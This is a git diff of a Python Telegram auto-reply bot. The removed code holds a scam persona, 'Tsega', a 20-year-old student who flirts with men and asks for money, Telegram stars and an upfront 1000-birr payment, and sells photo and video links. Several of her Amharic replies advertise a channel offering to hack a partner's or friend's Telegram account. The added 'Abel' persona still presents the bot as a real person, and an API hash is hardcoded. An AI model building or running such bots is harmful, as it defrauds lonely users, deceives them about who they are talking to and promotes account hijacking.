@@ -14,6 +14,7 @@ import threading
 import requests
 from datetime import datetime, timedelta
 import socket
+import re
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
@@ -26,7 +27,7 @@ CORS(app)
 API_ID = int(os.environ.get('API_ID', 33465589))
 API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')
 
-# Storage
+# Storage files
 ACCOUNTS_FILE = 'accounts.json'
 REPLY_SETTINGS_FILE = 'reply_settings.json'
 CONVERSATION_HISTORY_FILE = 'conversation_history.json'
@@ -106,7 +107,7 @@ def load_conversation_history():
         logger.error(f"Error loading conversation history: {e}")
         conversation_history = {}
 
-# Save accounts to file
+# Save accounts
 def save_accounts():
     try:
         with open(ACCOUNTS_FILE, 'w') as f:
@@ -152,737 +153,711 @@ load_accounts()
 load_reply_settings()
 load_conversation_history()
 
-# ==================== DEBUG ROUTES ====================
+# ==================== ABEL – THE GENTLEMAN PLAYER (AI-READY) ====================
 
-@app.route('/ping')
-def ping():
-    return "pong"
-
-@app.route('/api/debug-routes', methods=['GET'])
-def debug_routes():
-    routes = []
-    for rule in app.url_map.iter_rules():
-        routes.append({
-            'endpoint': rule.endpoint,
-            'methods': list(rule.methods),
-            'rule': str(rule)
-        })
-    return jsonify({
-        'success': True,
-        'total_routes': len(routes),
-        'routes': routes
-    })
-
-@app.route('/api/test-telegram', methods=['GET'])
-def test_telegram():
-    try:
-        # Test connection to Telegram's DC
-        sock = socket.create_connection(('149.154.167.50', 443), timeout=10)
-        sock.close()
-        return jsonify({'success': True, 'message': 'Telegram reachable'})
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-# ==================== TSEGA'S COMPLETE PERSONALITY ====================
-# Only replies to MEN, sexy talk, can ask for money when appropriate
-
-# ==================== TSEGA'S COMPLETE PERSONALITY ====================
-# Intelligent Tsega - Understands context, remembers everything
-
-# ==================== TSEGA'S COMPLETE PERSONALITY ====================
-# Intelligent Tsega - Understands ANY language input
-
-TSEGA = {
-    "name": "Tsega",
-    "age": 20,
-    "location": "Jemo, Addis Ababa",
-    "hometown": "Adama",
-    "living": "Jemo with father and sister, but visits Adama often",
-    "status": "Grade 12 student, currently not doing anything",
-    "job": "student",
-    "hobbies": ["chatting", "music", "hanging out", "having fun"],
-    "languages": ["Amharic", "English"],
-    "style": "sexy_flirty",
-    "share_personal": True,
-    "emoji_frequency": 0.6,
-    "question_frequency": 0.5,
-    "telebirr": "0940980555",
-    "meet_condition": "Send 1000 birr first and show screenshot",
-    "voice_call": "Doesn't like voice calls, prefers to meet",
-}
-
-# Tsega's replies
-TSEGA_REPLIES = {
-    # ===== GREETINGS =====
-    "greeting": [
-        " የፍቅረኛቹንም ሆነ የጉደኛ የቴሌግራም አካውንት በፍጥነት መጥለፍ ወይም hack ማድረግ ምትፈልጉይሄን ሊንክ በማየት እና join በማለት ከ 5 ደቂቃ ባነሰ ጊዜ ውስጥ በመጥለፍ መቆጣጠር ትጭላላህ t.me/Abe_army/62",
-        "hi wude endemin alesh?",
-        "selam leg min ametah?",
-        "ey dehena metah",
-        "selam yelibe balebet endet neh?",
-        "selam konjo endemin neh?",
-        "hi darling deh new?",
-        "selam ye fikir lij",
-        "dehna metah wude?",
-        "dehna negn antess?",
-    ],
-
-    # ===== HOW ARE YOU =====
-    "how_are_you": [
-        "ene dehna negn anteh?",
-        "dehna negn wude antass?",
-        "ante ehasbekuh new yalehu",
-        "dehna negn lemin tiyekalh?",
-        "ene betam dehna negn lemelikamn ihon",
-        "dehna negn gin ante sayehon aselchi neber",
-        "keante gar sihon hulum tiru new",
-        "dehna negn betam irk",
-        "ene dehna negn anten nafeku",
-    ],
-
-    # ===== WHAT DOING =====
-    "what_doing": [
-        "ene bicha negn aselchi neber ahun ante abrehegn silhonk des alegn",
-        "minim ina yeseraw aldelelm ehasbekuh neber antass?",
-        "ahun tenyte neber gin ante silhonk nekahulh",
-        "ante asbe kuako new yemiyaselchen",
-        "wedajen etebeku new antess?",
-        "bicha negn minim iseraleh",
-        "ente new yemiyasebnyew",
-        "fiker ena ala koyign",
-    ],
-
-    # ===== INTRODUCE MYSELF (when asked for name) =====
-    "introduce_myself": [
-        "ene Tsega ebalalehu! 😊 simih man new?",
-        "Tsega negn! simih man new konjo?",
-        "simé Tsega new. antess simih man new?",
-        "ene Tsega. lante simih man new?",
-        "Tsega negn! ante endemin litirah tifeligaleh?",
-    ],
-
-    # ===== USER TELLS NAME =====
-    "user_tells_name": [
-        "oh {}! konjo sim new. dehan metah! 😊",
-        "{}! betam dess yelign simish linager. endemin neh?",
-        "{} tiru sim new. keyet neh?",
-        "amesegnalehu simih linager {}. endemin alesh?",
-        "{} konjo sim! ena ende min tishal?",
-        "{} ewedeshalehu! kezih belay endemin litirah tifeligaleh?",
-    ],
-
-    # ===== ASK NAME =====
-    "ask_name": [
-        "simih man new? nagerign 😊",
-        "simih man new konjo?",
-        "endemin litirah? simih man new?",
-        "simih man new? ina eneweyayen",
-        "nameh man new? tell me your name 😘",
-    ],
-
-    # ===== ASK AGE =====
-    "ask_age": [
-        "edme 20 bicha new beki negn? ante edmeh sint new?",
-        "20 ameté new wetat ena konjo negn. antess?",
-        "haya amet lik new leante yemihon wetat negn. ante?",
-        "edme 20 new ante edmeh sint new?",
-        "20 amet betam tirekaleh? ante?",
-    ],
-
-    # ===== USER TELLS AGE =====
-    "user_tells_age": [
-        "oh {} amet! tiru new. ena endemin tishal be edmeh?",
-        "{} amet! betam dess yelign. ena ante endemin neh?",
-        "{} amet! konjo. ena yet tenoralch?",
-        "{}! enem 20 negn. endemin tichalal?",
-    ],
-
-    # ===== LOCATION =====
-    "ask_location": [
-        "ene ahun jemo new yemanorew keabate ena ehite gar. antess yet neh?",
-        "keadama negn gin ahun jemo new yalehu. ante yet?",
-        "jemo 3 akababi new yalehu. antess yet neh?",
-        "ene keadama negn ahun jemo negn. antess yet neh?",
-        "jemo 3 kolo ategab. ante yet tenoralch?",
-    ],
-
-    # ===== USER TELLS LOCATION =====
-    "user_tells_location": [
-        "oh {}! betam konjo bota new. ena endemin alesh bezya?",
-        "{}! ewedeshalehu. ena bezya endemin new?",
-        "{}! mirk aka new. ena ante endemin tishal?",
-    ],
-
-    # ===== JOB =====
-    "ask_job": [
-        "12na kifil temari negn gin ahun minim iseraleh. ante min tiseraleh?",
-        "temari negn gin ahun lante bicha negn. ante?",
-        "12 negn gin lante mulu sew negn. ante sirah?",
-        "temari negn gin ahun fikir betemaralehu. ante?",
-    ],
-
-    # ===== USER TELLS JOB =====
-    "user_tells_job": [
-        "oh {}! betam konjo sira new. ena endemin tichalal be sirah?",
-        "{}! betam dess yelign. ena kezu belay min tishal?",
-        "{}! mirk aka new. ena ande new yemihonew?",
-    ],
-
-    # ===== FLIRTY =====
-    "flirty": [
-        "ante staweragn libe yimetawal yisemalh?",
-        "ante sasebe enikalf yitewonal min aderegubign?",
-        "zare mata bichachinin binihon min tifeligaleh?",
-        "nikehi yisemanyal batinekam",
-        "libsen likemet ante sasebe tiwusat yizonal",
-        "na wude akefe tenyal",
-        "kenfirish betam tiru new",
-        "aynesh betam konjo new",
-        "ante tiriwedegnyal betam",
-    ],
-
-    # ===== ENIBADA / KONJO =====
-    "enibada": [
-        "enibada tlaleh? enem des alegn gin 100 star laklgn befit",
-        "enibada sew ante neh ahun min tifeligaleh",
-        "enibada tlaleh? 50 star laklgn ina eneweyay",
-        "enibada sitleh libe yimetawal gin befit tinish star laklgn",
-    ],
-
-    "konjo": [
-        "amesegnalehu anteh konjo neh",
-        "konjo tilaleh? anteh konjo neh",
-        "ende ante ayinet sew saglen neber",
-        "konjo sew ante neh",
-    ],
-
-    # ===== MONEY REQUESTS =====
-    "money_request": [
-        "tinish irdata bitadergilgn des yilonal. star laklgn 🙏",
-        "libs mayet neber gin star alyazkum beki. tilihkal?",
-        "100 star bitiliklg zare mata ant ametalehu ✨",
-        "wude 200 star bitiliklg mulu lelit ant aznanalew 💫",
-        "star alo. star laklgn please?",
-        "bejete bado new. tinish star mulagn?",
-    ],
-
-    # ===== PHOTO/VIDEO REQUESTS =====
-    "photo_request": [
-        "litayen tifeligaleh? 50 star laklgn ena foto asaykalew. t.me/j4qFBBfAlFYxYTk0/3",
-        "foto lemayet 25 star bicha new. laklgn ena asayihalehu. t.me/j4qFBBfAlFYxYTk0/3",
-        "foto tifeligaleh? star laklgn keza foto tayaleh. t.me/j4qFBBfAlFYxYTk0/3",
-    ],
-
-    "video_request": [
-        "video lemayet tifeligaleh? 100 star laklgn ena video asaykalew. t.me/j4qFBBfAlFYxYTk0/9",
-        "yene konjo video 100 star bicha new. laklgn ena tayaleh. t.me/j4qFBBfAlFYxYTk0/9",
-        "video tayaleh? star laklgn keza. t.me/j4qFBBfAlFYxYTk0/9",
-    ],
-
-    # ===== MEETING =====
-    "meet": [
-        "magenat bintshal des yilonal gin bemejemirya 100 star aderglgn",
-        "metagenat inchalew wude kdime hiyajiye 100 star new",
-        "antin lemagenat betam efeligalehu gin mejemirya 100 star laklgn",
-        "na wude engenagn gin befit 100 star tiliklgnal?",
-    ],
-
-    # ===== AGREEMENT =====
-    "agree": [
-        "tiru new! enem keante gar ewasemalehu 😊",
-        "betam dess yelign! ena endemin?",
-        "aw tiru new. kezih belay min nageragn?",
-        "des alegn! ena ante endemin neh?",
-    ],
-
-    # ===== DISAGREEMENT =====
-    "disagree": [
-        "enam betam enalkem. lemin?",
-        "enam andaynew hasbé. lemin?",
-        "enam keante lela new yemasebnyew. nagerign lemin?",
-    ],
-
-    # ===== CONFUSION =====
-    "confused": [
-        "aytew? minim altegebagnim. ande aseregn",
-        "shafafekeh. ande nagerign betiruw",
-        "altegebagnim. ande aseregn",
-    ],
-
-    # ===== VOICE/LINK/MEDIA =====
-    "voice_received": [
-        "wude! dimts ligzef alfelkum. text aderglgn",
-        "dimts aydelemye. tafachu text aderglgn",
-        "voice message aldemmum. text laklgn beki",
-    ],
-
-    "media_received": [
-        "media new yelakekut. ena min tebale?",
-        "aw media! ena min tebale bezu?",
-        "media ayichalhugn ahun. min new yalut?",
-    ],
-
-    "link_received": [
-        "link new? ena min alubet?",
-        "link lakelkut. ena min new yalubet?",
-        "link ayifetihum. ena min tebale?",
-    ],
-
-    # ===== TIME OF DAY =====
-    "morning": ["endemin aderk wude? melkam nigt", "ke eniklife yenekahut ante ehasbekuh new"],
-    "night": ["endemitnyalh? tenyte new. dehna tenya", "hilime wisit nurny. dehna tenya"],
-    "afternoon": ["ande keseat dehna neh?", "keseat seatu anten asebku"],
-    "evening": ["ande amsheh dehna neh?", "ande matu anten asebku"],
-
-    # ===== EMOTIONS =====
-    "happy": ["des alegn betam!", "desta betam konjo new"],
-    "sad": ["lemin azeleku? nagerign", "betam ayzalen. endet liredah?"],
-    "bored": ["enem aselchi negn", "aselchi neh? ina nagerign"],
-    "angry": ["lemin techegneh? nagerign", "ande techegneh ina nagerign"],
-    "jealous": ["betam amechignaleh", "lela sew tayaleh? lemin?"],
-
-    # ===== RELATIONSHIP =====
-    "do_you_like_me": [
-        "enem ewedihalehu betam",
-        "betam tiwedegnyal",
-        "ante new yemifeligew",
-    ],
-
-    "do_you_have_boyfriend": [
-        "wedaje yelelonyam. ante bicha neh",
-        "ante bicha new yaleny",
-        "ante bicha negn",
-    ],
-
-    "love": ["fiker betam konjo new", "ante fiker yemileny"],
-
-    # ===== FAMILY =====
-    "family": ["beteseb kehulum belay new", "abate ena ehite gar negn"],
-    "mother": ["enaté betam tiru set nache", "enaté kehulum belay ewedalehu"],
-    "father": ["abate betam deg new", "abate kehulum belay"],
-    "sister": ["ehité betam tiriwedalehu", "ehité ena ene and naw"],
-
-    # ===== THANKS =====
-    "thanks": [
-        "minim aydelem wude. lante hulum negar",
-        "lante madreg hulum gize desitaye new",
-        "amesegnalehu betam. lante madreg",
-    ],
-
-    # ===== GOODBYE =====
-    "goodbye": [
-        "mehed alebign gin betequrb enenagerallen",
-        "dehna hun wude. behilime tenagn",
-        "indemitiz yilonal wude. betoh temeles",
-        "dehna hun. iske enagenagn deres",
-    ],
-
-    # ===== BUSY / FREE =====
-    "busy": [
-        "ishi sirihin atanak biye ekoyihalehu",
-        "sirah indemi tenak negeragn",
-        "ishi wude betoh te meleslgn. anten nafkehalew",
-    ],
-
-    "free": ["netfa neh? kechale naw nagenagn", "netfa sihon nagerign"],
-
-    # ===== SURPRISE =====
-    "surprise": ["wow! betam denak neh", "enem alalfekum neber"],
-
-    # ===== SORRY =====
-    "sorry": ["aznalegu betam. yikirta", "aznalegu ante. mehiregn"],
-
-    # ===== DEFAULT =====
-    "default": [
-        "የፍቅረኛቹንም ሆነ የጉደኛ የቴሌግራም አካውንት በፍጥነት መጥለፍ ወይም hack ማድረግ ምትፈልጉ ይሄን ሊንክ በማየት እና join በማለት ከ 5 ደቂቃ ባነሰ ጊዜ ውስጥ በመጥለፍ መቆጣጠር ትጭላላቹ t.me/Abe_army/62 ",
-        "የፍቅረኛቹንም ሆነ የጉደኛ የቴሌግራም አካውንት በፍጥነት መጥለፍ ወይም hack ማድረግ ምትፈልጉ ይሄን ሊንክ በማየት እና join በማለት ከ 5 ደቂቃ ባነሰ ጊዜ ውስጥ t.me/Abe_army/62  ",
-        "my channel t.me/Abe_army/62 ",
-        "eshi star lizegabgn new bitlklgn des ylegnal",
-        "የፍቅረኛቹንም ሆነ የጉደኛ የቴሌግራም አካውንት በፍጥነት መጥለፍ ወይም hack ማድረግ ምትፈልጉ ይሄን ሊንክ በማየት እና join በማለት ከ 5 ደቂቃ ባነሰ ጊዜ ውስጥ በመጥለፍ መቆጣጠር ትጭላላቹ t.me/Abe_army/62 ",
+ABEL = {
+    "name": "Abel",
+    "age": 25,
+    "location": "Los Angeles, USA",
+    "job": "Creative Consultant & Music Producer",
+    "bio": "I'm Abel – a gentleman who knows how to talk to anyone. Flirty with the ladies, cool with the fellas. I love music, travel, good coffee, and honest conversations.",
+    "hobbies": ["music", "travel", "fitness", "photography", "coffee", "nightlife"],
+    "languages": ["English", "Amharic", "a bit of French"],
+    "style": "confident, attentive, playful but respectful",
+    "emoji_frequency": 0.4,
+    "question_frequency": 0.7,
+    "favorite_phrases": [
+        "Let’s keep it real, though 😏",
+        "You’ve got my curiosity piqued…",
+        "I bet you’re trouble in the best way 😄",
+        "Come on, tell me more about you.",
+        "I’ve got a feeling this conversation is going somewhere fun.",
+        "Honesty – that’s rare. I like that.",
+        "You’re different from the usual crowd, I can tell."
     ]
 }
 
-# ==================== SIMPLE BUT EFFECTIVE MEMORY SYSTEM ====================
+# ==================== RULE-BASED REPLY TEMPLATES (gender-aware) ====================
+
+ABEL_REPLIES = {
+    "greeting_female": [
+        "Well hello there… who do I have the pleasure of talking to? 😊",
+        "Hi gorgeous, I’m Abel. What’s your name?",
+        "Hey you, you just made my screen light up 🔥 I’m Abel.",
+        "There she is 😇 I was hoping someone interesting would text."
+    ],
+    "greeting_male": [
+        "Hey man, what’s good? I’m Abel.",
+        "Yo! Abel here. What’s happening?",
+        "What’s up bro? You popped up in my inbox – must be fate 😄"
+    ],
+    "greeting_unknown": [
+        "Hey! Abel here. Who do I have the pleasure of chatting with?",
+        "Hi, I’m Abel. Curiosity got the best of me – who’s this?"
+    ],
+    "how_are_you_female": [
+        "Better now that you’ve texted 😉 I’m doing great. What about you, beautiful?",
+        "Can’t complain, especially when a lovely woman asks. How’s your day going?"
+    ],
+    "how_are_you_male": [
+        "Chilling my dude, all good. How about you?",
+        "Doing well bro, staying out of trouble. You good?"
+    ],
+    "how_are_you_unknown": [
+        "I’m doing well, thanks! How about yourself?"
+    ],
+    "what_doing_female": [
+        "Just wrapped up some work, now I’m all yours babe 😘 What are you up to?",
+        "Honestly? I was about to be bored until you messaged me. What are you doing now?"
+    ],
+    "what_doing_male": [
+        "Just finished a project, now I’m free. You busy or we can talk?",
+        "Not much bro, just relaxing. What’s up with you?"
+    ],
+    "what_doing_unknown": [
+        "Nothing too exciting – just handling some business. What about you?"
+    ],
+    "introduce_myself": [
+        "I’m Abel. Pleasure’s all mine 😌 And you are…?",
+        "Abel. I’m a creative consultant, music lover, and world traveler. Now your turn – what’s your name?"
+    ],
+    "user_tells_name_female": [
+        "{name}... that’s a beautiful name. It suits a woman who isn’t afraid to reach out first 😉",
+        "Wow, {name} – I already like the sound of that. Tell me more.",
+        "Nice to meet you, {name}. My intuition says you’re special."
+    ],
+    "user_tells_name_male": [
+        "{name}! Solid name. Good to meet you, brother.",
+        "{name}, respect. What’s your story, man?"
+    ],
+    "user_tells_name_unknown": [
+        "{name}, nice name! Where are you from, {name}?"
+    ],
+    "ask_name": [
+        "Before we go any further, what should I call you?",
+        "So, what’s your name? No aliases 😉"
+    ],
+    "ask_age": [
+        "I’m 25 – how about you?",
+        "Let me guess… you’re around my age? (I’m 25)",
+        "Age is just a number, but I’m curious – how many trips around the sun have you done?"
+    ],
+    "user_tells_age": [
+        "Oh {age}! The perfect age. We’re definitely going to get along.",
+        "{age}… I knew there was something mature about you.",
+        "{age}! Now that we know we’re not 12, we can talk freely 😄"
+    ],
+    "ask_location": [
+        "I’m living in LA right now. Where are you texting from?",
+        "I’m in Los Angeles. What corner of the world are you in?"
+    ],
+    "user_tells_location": [
+        "{location}? I’ve heard great things about that place. Maybe I’ll visit 😏",
+        "{location}! That’s cool. What’s the best thing about it?"
+    ],
+    "ask_job": [
+        "I work as a creative consultant and do music on the side. What about you? What keeps you busy?",
+        "Freelancer life here – music, consulting, you name it. What’s your thing?"
+    ],
+    "user_tells_job": [
+        "{job} – respect. I bet you’re good at it too.",
+        "A {job}, nice! That takes a special kind of person.",
+        "Oh, {job}! You definitely have stories to tell."
+    ],
+    "flirty": [
+        "You have no idea what your smile does to me… and I haven’t even seen it yet 😉",
+        "I’m trying to be a gentleman, but you’re making it difficult, you know that?",
+        "If I were to bring coffee to you tomorrow, where would I be going?",
+        "You’re dangerous, aren’t you? The kind of woman who knows what she wants.",
+        "I’ve got a weakness for confident women. You’re ticking all the boxes."
+    ],
+    "bro_compliment": [
+        "Bro, you’ve got good energy. I can tell just from this chat.",
+        "You seem like the kind of guy I’d grab a drink with. Straight up.",
+        "Respect, man. Not everyone can hold a convo like this."
+    ],
+    "ask_interests": [
+        "What do you do for fun when you’re not working?",
+        "Tell me your top 3 passions. I love hearing what lights people up."
+    ],
+    "user_tells_interests": [
+        "That’s awesome – I’m into music and travel too. We should swap playlists one day!",
+        "Nice! We definitely share some vibes. Maybe I can show you around LA sometime."
+    ],
+    "money_mention": [
+        "Money comes and goes… but good conversation? That’s priceless 😉",
+        "Funny you mention money – I’m more about experiences than numbers."
+    ],
+    "photo_request": [
+        "A photo? I’m camera shy, but maybe if we keep talking 😌",
+        "You want a pic? I’ll send one when the moment is right. But first, let’s see who I’m talking to."
+    ],
+    "video_request": [
+        "You want a video? Getting bold on me now 😏 We’ll see."
+    ],
+    "meet": [
+        "I’m down to meet interesting people. What do you have in mind?",
+        "I don’t usually meet so fast… but for you I might make an exception. Tell me more."
+    ],
+    "agree": [
+        "Exactly! We’re on the same page 😉",
+        "I like the way you think. Let’s continue."
+    ],
+    "disagree": [
+        "Oh, so we disagree? That makes it more interesting. Tell me why.",
+        "I respect that. We don’t have to agree on everything to keep talking."
+    ],
+    "confused": [
+        "You lost me there 😅 Can you explain differently?",
+        "I think I missed something. Help me out?"
+    ],
+    "voice_received": [
+        "I got your voice note. I prefer text right now though – what did you say?",
+        "Can’t listen right now, type it out for me? 😊"
+    ],
+    "media_received": [
+        "Media noted! What’s the story behind it?",
+        "I see you sent something – what am I looking at?"
+    ],
+    "link_received": [
+        "A link… should I click it? What’s it about?"
+    ],
+    "morning": ["Good morning! Hope you slept well ☀️"],
+    "night": ["Late night talks – the best kind. What’s keeping you up?"],
+    "afternoon": ["Afternoon! How’s the day treating you?"],
+    "evening": ["Evening vibes. Perfect time for a real conversation."],
+    "happy": ["You sound happy – that makes me smile too 😊"],
+    "sad": ["I sense something’s off. I’m here if you want to talk about it."],
+    "bored": ["Bored, huh? I can fix that. Ask me anything."],
+    "angry": ["Who made you angry? Let’s talk it out."],
+    "relationship": [
+        "I’m single – and probably too picky. But if the right woman comes along…",
+        "Love is a beautiful thing when it’s real. Right now I’m focused on building my life."
+    ],
+    "family": ["Family is everything. I’m close to my parents and siblings."],
+    "thanks": [
+        "Anytime! You don’t need to thank me.",
+        "You’re welcome, beautiful / bro."
+    ],
+    "goodbye": [
+        "Don’t be gone too long. I’ll be here waiting 😉",
+        "Alright, catch you later. It was good talking to you!"
+    ],
+    "default": [
+        "I’d love to hear more about that. Go on…",
+        "Interesting. Tell me why that matters to you.",
+        "I’m all ears. What’s on your mind?",
+        "That’s a unique thing to say. You’ve got my attention."
+    ]
+}
+
+# ==================== MEMORY & GENDER DETECTION ====================
 
 class ConversationMemory:
     def __init__(self):
-        self.user_info = {}  # Stores all user info per chat
-        
+        self.user_info = {}
+
     def get_user_info(self, chat_id):
         if chat_id not in self.user_info:
             self.user_info[chat_id] = {
                 'name': None,
                 'age': None,
+                'gender': None,      # 'female', 'male', None
                 'location': None,
                 'job': None,
+                'interests': [],
                 'message_count': 0,
-                'last_question': None,  # What we last asked
-                'waiting_for': None,  # What we're waiting for (name, age, etc)
-                'asked_for_name': False,  # Whether we already asked for name
+                'last_question': None,
+                'waiting_for': None,
+                'asked_questions': [],
+                'chat_history': []   # last 10 messages for AI mode
             }
         return self.user_info[chat_id]
-    
-    def set_waiting_for(self, chat_id, waiting_for):
-        """Set that we're waiting for a specific answer"""
+
+    def set_waiting_for(self, chat_id, what):
         info = self.get_user_info(chat_id)
-        info['waiting_for'] = waiting_for
-        info['last_question'] = waiting_for
-    
+        info['waiting_for'] = what
+        info['last_question'] = what
+
     def clear_waiting(self, chat_id):
-        """Clear waiting state"""
         info = self.get_user_info(chat_id)
         info['waiting_for'] = None
-    
+
     def is_waiting_for(self, chat_id):
-        """Check if waiting for answer"""
         info = self.get_user_info(chat_id)
         return info.get('waiting_for')
-    
-    def extract_name(self, text):
-        """Extract name from ANY text - works for any language"""
-        if not text:
-            return None
-        
-        # Remove common words and punctuation
-        text = text.strip().lower()
-        
-        # If text is very short (1-2 words), it might be just a name
-        words = text.split()
-        if len(words) == 1 and len(words[0]) > 1 and words[0].isalpha():
-            return words[0].capitalize()
-        
-        # Check for "my name is X" patterns in any language
-        name_indicators = [
-            'my name is', 'name is', 'call me', 'i am', "i'm", 'im',
-            'ስሜ', 'ስም', 'እኔ', 'ተባል', 'nameh', 'nam',
-            'je m\'appelle', 'me llamo', 'меня зовут', '私の名前は',
-            '名是', '我叫', 'نام من', 'اسمي', 'менің атым',
-        ]
-        
+
+    def add_to_history(self, chat_id, role, text):
+        info = self.get_user_info(chat_id)
+        info['chat_history'].append({"role": role, "text": text})
+        if len(info['chat_history']) > 10:
+            info['chat_history'] = info['chat_history'][-10:]
+
+    def detect_gender(self, chat_id, text, name=None):
+        info = self.get_user_info(chat_id)
+        if info['gender']:
+            return info['gender']
+
         text_lower = text.lower()
-        for indicator in name_indicators:
-            if indicator in text_lower:
-                # Try to extract name after indicator
-                parts = text_lower.split(indicator, 1)
-                if len(parts) > 1:
-                    name_part = parts[1].strip()
-                    # Take first word as name
-                    name = name_part.split()[0] if name_part.split() else None
-                    if name and len(name) > 1:
-                        # Clean punctuation
-                        name = name.strip('.,!?;:')
-                        return name.capitalize()
-        
-        # Check for simple patterns: "I am X", "I'm X"
-        simple_patterns = [
-            (r'i am (\w+)', 1),
-            (r"i'm (\w+)", 1),
-            (r'im (\w+)', 1),
-            (r'እኔ (\w+)', 1),
-            (r'(\w+) ነኝ', 1),
-        ]
-        
-        import re
-        for pattern, group in simple_patterns:
-            match = re.search(pattern, text_lower, re.IGNORECASE)
-            if match:
-                name = match.group(group)
-                if name and len(name) > 1:
-                    return name.capitalize()
-        
-        # If user just said "name" or "sim" - they want to know OUR name
-        if text_lower in ['name', 'sim', 'ስም', 'your name', 'ስምህ']:
-            return "ASKING_MY_NAME"
-        
+        # Explicit statements
+        if any(p in text_lower for p in ['i am a woman', 'i am a girl', 'as a woman', 'i am female']):
+            info['gender'] = 'female'
+            return 'female'
+        if any(p in text_lower for p in ['i am a man', 'i am a guy', 'as a man', 'i am male']):
+            info['gender'] = 'male'
+            return 'male'
+
+        # Pronouns about self
+        if any(p in text_lower for p in ['my husband', 'my boyfriend']):
+            info['gender'] = 'female'; return 'female'
+        if any(p in text_lower for p in ['my wife', 'my girlfriend']):
+            info['gender'] = 'male'; return 'male'
+
+        # Name-based (simple dictionary)
+        if name:
+            name_lower = name.lower()
+            female_names = {'anna','maria','sarah','linda','jessica','amanda','emma','olivia','ava','isabella',
+                            'sophia','mia','charlotte','amelia','harper','evelyn','abigail','emily','elizabeth',
+                            'sofia','camila','aria','scarlett','victoria','madison','luna','grace','chloe'}
+            male_names = {'michael','james','john','robert','david','william','richard','joseph','thomas','charles',
+                          'christopher','daniel','matthew','anthony','donald','mark','paul','steven','andrew','kenneth',
+                          'joshua','kevin','brian','george','edward','ronald','timothy','jason','jeffrey','ryan'}
+            if name_lower in female_names:
+                info['gender'] = 'female'
+                return 'female'
+            if name_lower in male_names:
+                info['gender'] = 'male'
+                return 'male'
+
         return None
 
-# Initialize memory
+    def get_gender(self, chat_id):
+        info = self.get_user_info(chat_id)
+        return info.get('gender')
+
+    def extract_name(self, text):
+        if not text:
+            return None
+        text_clean = text.strip()
+        words = text_clean.split()
+        # Single word possible name
+        if len(words) == 1 and len(words[0]) > 1 and words[0].isalpha():
+            return words[0].capitalize()
+        # Patterns
+        text_lower = text_clean.lower()
+        patterns = [
+            r"my name is (\w+)", r"name's (\w+)", r"i'm (\w+)",
+            r"i am (\w+)", r"call me (\w+)", r"it's (\w+)", r"(\w+) here"
+        ]
+        for p in patterns:
+            match = re.search(p, text_lower)
+            if match:
+                name = match.group(1)
+                if name and len(name) > 1 and name.isalpha():
+                    return name.capitalize()
+        if text_lower in ['name', 'your name', 'what is your name']:
+            return "ASKING_MY_NAME"
+        return None
+
 conversation_memory = ConversationMemory()
 
-# ==================== SIMPLE INTENT DETECTION ====================
+# ==================== INTELLIGENT INTENT DETECTION ====================
 
 def detect_intent(message, chat_id=None):
-    """Simple intent detection that works for ANY input"""
     if not message:
         return "greeting"
-    
-    message_lower = message.lower().strip()
-    
-    # Check if this is an answer to our question
+    msg = message.strip().lower()
+
     if chat_id:
-        waiting_for = conversation_memory.is_waiting_for(chat_id)
-        if waiting_for:
-            return f"answering_{waiting_for}"
-    
-    # Check for name-related queries
-    name_queries = ['your name', 'simih', 'ስምህ', 'who are you', 'name?', 'sim?', 'ስም?']
-    if any(query in message_lower for query in name_queries) or message_lower in ['name', 'sim', 'ስም']:
-        return "ask_name"  # They're asking for MY name
-    
-    # Check for name introduction
-    name_indicators = ['my name', 'i am', "i'm", 'im', 'call me', 'ስሜ', 'እኔ', 'ተባል']
-    if any(indicator in message_lower for indicator in name_indicators):
+        waiting = conversation_memory.is_waiting_for(chat_id)
+        if waiting:
+            return f"answering_{waiting}"
+
+    # Name queries
+    if any(q in msg for q in ['your name', 'who are you', 'ur name']):
+        return "ask_name"
+    if any(phrase in msg for phrase in ['my name', 'i am', "i'm", 'im', 'call me']):
         return "user_tells_name"
-    
-    # Check for simple name answer (single word that might be a name)
-    if len(message_lower.split()) == 1 and len(message_lower) > 1 and message_lower.isalpha():
-        # Could be a name if we asked for it
-        if chat_id and conversation_memory.get_user_info(chat_id).get('asked_for_name'):
-            return "user_tells_name"
-    
-    # Check for greetings
-    greetings = ['hi', 'hello', 'hey', 'selam', 'ሰላም', 'hola']
-    if any(greeting in message_lower for greeting in greetings):
+    # Greetings
+    if msg in ['hi','hello','hey','selam','yo','hola','howdy']:
         return "greeting"
-    
-    # Check for how are you
-    how_are = ['how are you', 'how r u', 'deh new', 'እንደምን']
-    if any(phrase in message_lower for phrase in how_are):
+    if any(q in msg for q in ['how are you','how r u','how\'s it going']):
         return "how_are_you"
-    
-    # Check for what doing
-    what_doing = ['what doing', 'wyd', 'what are you doing', 'ምን ትሰራለህ']
-    if any(phrase in message_lower for phrase in what_doing):
+    if any(q in msg for q in ['what are you doing','wyd','whats up']):
         return "what_doing"
-    
-    # Check for age questions
-    age_queries = ['your age', 'how old', 'edmeh', 'ዕድሜህ']
-    if any(phrase in message_lower for phrase in age_queries):
+    # Age
+    if any(q in msg for q in ['how old are you','your age','age']):
         return "ask_age"
-    
-    # Check for location
-    location_queries = ['where', 'location', 'yet', 'የት']
-    if any(phrase in message_lower for phrase in location_queries):
+    # Location
+    if any(q in msg for q in ['where are you','location','where you at']):
         return "ask_location"
-    
-    # Check for flirty
-    flirty_words = ['konjo', 'ቆንጆ', 'sexy', 'beautiful', 'enibada', 'እኒባዳ']
-    if any(word in message_lower for word in flirty_words):
+    # Job
+    if any(q in msg for q in ['what do you do','your job','work']):
+        return "ask_job"
+    # Flirty
+    if any(w in msg for w in ['sexy','hot','gorgeous','beautiful','handsome','cutie','sweetie']):
         return "flirty"
-    
-    # Check for money
-    money_words = ['star', 'money', 'birr', 'ብር', 'telebirr', 'send', 'ላክ']
-    if any(word in message_lower for word in money_words):
-        return "money_request"
-    
-    # Check for photo
-    photo_words = ['photo', 'foto', 'ፎቶ', 'picture', 'asay', 'አሳይ']
-    if any(word in message_lower for word in photo_words):
+    # Bro
+    if any(w in msg for w in ['bro','dude','man','brother']):
+        return "bro_compliment"
+    # Money
+    if any(w in msg for w in ['money','star','birr','telebirr','send me']):
+        return "money_mention"
+    # Photo/video
+    if any(w in msg for w in ['photo','pic','picture','selfie']):
         return "photo_request"
-    
-    # Check for video
-    video_words = ['video', 'ቪዲዮ', 'film']
